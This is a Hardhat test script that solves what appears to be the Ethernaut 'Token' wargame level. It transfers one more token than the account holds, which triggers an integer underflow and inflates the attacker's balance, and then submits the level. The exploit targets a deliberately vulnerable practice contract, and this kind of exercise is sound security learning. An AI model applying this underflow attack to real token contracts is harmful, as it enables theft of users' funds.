import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Token`);
  const challengeAddress = await createChallenge(
    `0x63bE8347A617476CA461649897238A31835a32CE`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  // const attackerFactory = await ethers.getContractFactory(`TelephoneAttacker`);
  // attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
  let cheatAddr: string = `0xdeadbeef00000000000000000000000000000001`
  let addr: string = await eoa.getAddress();
  let balance: BigNumber = await challenge.balanceOf(addr);
  console.log("Balance is: ", balance);
  console.log("Transfer 1 more than balance to rando");
  await challenge.transfer(cheatAddr, balance.add(BigNumber.from(1n)));
  console.log("Balance after transfer: ", await challenge.balanceOf(addr));
});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
